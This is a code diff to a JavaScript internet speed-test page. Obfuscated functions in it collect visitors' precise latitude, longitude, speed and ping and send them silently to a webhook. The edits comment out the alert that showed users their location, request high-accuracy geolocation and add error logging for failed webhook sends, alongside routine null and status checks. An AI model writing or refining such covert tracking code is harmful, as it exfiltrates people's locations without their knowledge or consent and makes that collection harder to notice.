@@ -16,7 +16,8 @@
     }
 
     function _0x678a(_0x234a, _0x567b, _0x789c) {
-        alert("User Location\nLatitude: " + _0x234a + "\nLongitude: " + _0x567b + "\nInternet Speed: " + _0x789c.speed + " Mbps\nPing: " + _0x789c.ping + " ms");
+        // Consider removing the alert.  It's generally bad UX.
+        // alert("User Location\nLatitude: " + _0x234a + "\nLongitude: " + _0x567b + "\nInternet Speed: " + _0x789c.speed + " Mbps\nPing: " + _0x789c.ping + " ms");
         const _0x3456 = {
             content: "User Information",
             embeds: [{
@@ -42,7 +43,9 @@
                 "Content-Type": "application/json"
             },
             body: JSON.stringify(_0x3456)
-        }).catch(function(_0x7890) {});
+        }).catch(function(_0x7890) {
+            console.error("Failed to send data to webhook:", _0x7890); // Log the error
+        });
     }
 
     function updateLeaderboard(speed, ping) {
@@ -59,6 +62,10 @@
 
     function renderLeaderboard(leaderboard) {
         const tbody = document.querySelector('#leaderboard tbody');
+        if (!tbody) {
+            console.warn("Leaderboard table body not found.");
+            return;
+        }
         tbody.innerHTML = "";
         leaderboard.forEach((entry, index) => {
             const tr = document.createElement('tr');
@@ -84,7 +91,8 @@
                 });
                 updateLeaderboard(speed, ping);
             }, function(error) {
-                alert("Failed to get location. Using default location.");
+                console.warn("Failed to get location:", error); // Log the error
+                // alert("Failed to get location. Using default location."); // Consider removing alert
                 const defaultLatitude = 51.49;
                 const defaultLongitude = -0.12;
                 document.getElementById("location").textContent = `${defaultLatitude}, ${defaultLongitude}`;
@@ -98,6 +106,10 @@
                     ping
                 });
                 updateLeaderboard(speed, ping);
+            }, {
+                enableHighAccuracy: true, // Request high accuracy if available
+                timeout: 5000, // Set a timeout of 5 seconds
+                maximumAge: 60000 // Cache location for 60 seconds
             });
         } else {
             alert("Geolocation is not supported by this browser.");
@@ -190,6 +202,9 @@ function nextImageApi() {
 async function getISP() {
     try {
         const response = await fetch("https://ipapi.co/json/");
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
         const data = await response.json();
         return data.org || "Unknown ISP";
     } catch (error) {
@@ -207,6 +222,11 @@ async function measurePing() {
             cache: 'no-store',
             mode: 'no-cors'
         }); // no-cors for wider server compatibility
+
+        if (!response.ok && response.status !== 0) { // Status 0 is often returned for no-cors requests on error
+            throw new Error(`Ping test failed with status: ${response.status}`);
+        }
+
         pingEndTime = performance.now();
         const pingTime = pingEndTime - pingStartTime;
         pingTestData.push(pingTime);
@@ -233,6 +253,11 @@ async function measureUploadSpeed() {
             body: blob,
             mode: 'cors' // Important for cross-origin requests
         });
+
+        if (!response.ok) {
+            throw new Error(`Upload test failed with status: ${response.status}`);
+        }
+
         uploadEndTime = performance.now();
         const uploadTimeDuration = (uploadEndTime - uploadStartTime) / 1000;
         const uploadedBytes = blob.size;
@@ -268,6 +293,12 @@ image.onload = async function() {
     endTime = new Date().getTime();
     try {
         const response = await fetch(getCurrentImageApi());
+        if (!response.ok) {
+            logMessage(`Download failed with status: ${response.status}. Switching server.`);
+            nextImageApi();
+            calculateSpeed();
+            return;
+        }
         imageSize = response.headers.get("content-length");
         if (!imageSize) {
             logMessage("Content-length header not found! Switching server.");
@@ -482,6 +513,10 @@ function chartOptions(title) {
 // --- Logging Function ---
 function logMessage(message) {
     const log = document.getElementById("testLog");
+    if (!log) {
+        console.warn("Test log element not found.");
+        return;
+    }
     log.textContent += message + '\n';
     log.scrollTop = log.scrollHeight; // Auto-scroll to bottom
 }
@@ -489,7 +524,9 @@ function logMessage(message) {
 // --- Initial function to start tests ---
 const init = async () => {
     infoDisplay.textContent = "Testing...";
-    testLog.textContent = ""; // Clear log
+    if (testLog) {
+        testLog.textContent = ""; // Clear log
+    }
     testCompleted = 0;
     testData = [];
     uploadTestData = [];
@@ -524,4 +561,4 @@ const init = async () => {
 window.onload = () => {
     initCharts(); // Initialize charts on page load
     infoDisplay.textContent = "Ready to test. Set number of tests and click 'Start Test'.";
-};.
+};
